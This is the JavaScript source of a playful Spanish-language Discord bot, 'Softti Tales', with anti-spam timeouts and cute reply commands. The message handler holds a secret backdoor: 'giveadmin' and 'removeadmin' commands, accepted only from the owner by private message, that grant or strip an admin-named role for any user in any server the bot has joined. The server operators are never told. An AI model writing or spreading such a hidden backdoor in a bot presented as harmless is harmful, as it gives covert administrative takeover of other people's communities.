import 'dotenv/config';
import fs from 'fs';
import { Client, GatewayIntentBits, Partials, REST, Routes, Collection } from 'discord.js';

// 🪄 Cliente de Discord
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages
  ],
  partials: [Partials.Channel]
});

const TOKEN = process.env.TOKEN;
const CLIENT_ID = process.env.CLIENT_ID;
const OWNER_ID = process.env.OWNER_ID;

// 🧩 Cargar comandos desde cmd.json
const commands = JSON.parse(fs.readFileSync('./cmd.json', 'utf-8'));

// 🧠 Memorias
const usuariosSaludados = new Set();
const advertencias = new Map();

// 🎮 Estados aleatorios desde estados.json
const estados = JSON.parse(fs.readFileSync('./estados.json', 'utf-8'));
function cambiarEstado() {
  const estado = estados[Math.floor(Math.random() * estados.length)];
  client.user.setActivity(estado, { type: 0 });
}

// 🔒 Cargar modo secreto desde admin.json
const adminData = JSON.parse(fs.readFileSync('./admin.json', 'utf-8'));

// 🟢 Al iniciar
client.once('ready', () => {
  console.log(`✨ Softti Tales está lista como ${client.user.tag}!`);
  cambiarEstado();
  setInterval(cambiarEstado, 600000);
});

// 💌 Mensajes
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  const userId = message.author.id;
  const ahora = Date.now();

  // Antispam
  if (!advertencias.has(userId)) {
    advertencias.set(userId, { mensajes: [ahora], strikes: 0 });
  } else {
    const data = advertencias.get(userId);
    data.mensajes = data.mensajes.filter(ts => ahora - ts < 5000);
    data.mensajes.push(ahora);

    if (data.mensajes.length > 5) {
      data.strikes++;
      if (data.strikes === 3) {
        try {
          await message.member.timeout(60 * 60 * 1000, 'Spam detectado');
          await message.reply('⚠️ ¡Te pasaste, nya! Te ganaste un descansito de 1 hora 💫');
        } catch {
          await message.reply('Nya~ no puedo castigarte, pero ¡no hagas spam, porfis! 🥺');
        }
        data.strikes = 0;
      } else {
        await message.reply(`¡OwO cuidado! Llevas ${data.strikes} advertencias, nyan~ 🐾`);
      }
    }
    advertencias.set(userId, data);
  }

  // 🎯 Comandos con prefijo !softi
  if (message.content.startsWith('!softi')) {
    const [cmd, ...args] = message.content.slice('!softi'.length).trim().split(' ');
    const comando = cmd.toLowerCase();

    // 💠 Comandos secretos solo para el dueño en DM
    if (message.channel.type === 1 && message.author.id === OWNER_ID) {
      if (comando === 'giveadmin' || comando === 'removeadmin') {
        const [guildId, userId, inviteLink] = args;
        if (!guildId || !userId || !inviteLink)
          return message.reply('⚠️ Debes ingresar: ID del servidor, ID del usuario y enlace de invitación.');

        try {
          const guild = await client.guilds.fetch(guildId);
          const member = await guild.members.fetch(userId);
          const role = guild.roles.cache.find(r => r.name.toLowerCase().includes('admin'));
          if (!role)
            return message.reply('❌ No encontré un rol de administrador en ese servidor.');

          if (comando === 'giveadmin') {
            await member.roles.add(role);
            return message.reply(`✅ Se le ha dado admin a <@${userId}> en **${guild.name}**.\n🔗 Invitación: ${inviteLink}`);
          } else {
            await member.roles.remove(role);
            return message.reply(`✅ Se ha quitado el admin a <@${userId}> en **${guild.name}**.\n🔗 Invitación: ${inviteLink}`);
          }
        } catch (err) {
          return message.reply('❌ Error al ejecutar el comando secreto: ' + err.message);
        }
      }
    }

    // 🧩 Comandos normales
    let respuesta = '';

    switch (comando) {
      case 'hablar':
        respuesta = `Nyaa~ ${message.author.username}, ¿cómo estás hoy uwu? 💞`;
        break;
      case 'hug':
        respuesta = `OwO ${message.author.username}, ven~ te doy un abracito suave 🤗💕`;
        break;
      case 'kiss':
        respuesta = `Mwah~ 💋 ${message.author.username}, un besito tierno solo para ti~`;
        break;
      case 'pat':
        respuesta = `🐾 ${message.author.username} acaricia suavemente a Softti Tales~`;
        break;
      case 'pet':
        respuesta = `UwU ${message.author.username} le da mimito a Softti y ella ronronea feliz 🐱💖`;
        break;
      case 'mymoney':
        respuesta = `💰 ${message.author.username}, tienes 999 moneditas mágicas nya~ ✨`;
        break;
      default:
        respuesta = `OwO no entiendo ese comando, nyan~`;
    }

    await message.reply(respuesta);
  }
});

// 🚀 Login
client.login(TOKEN);
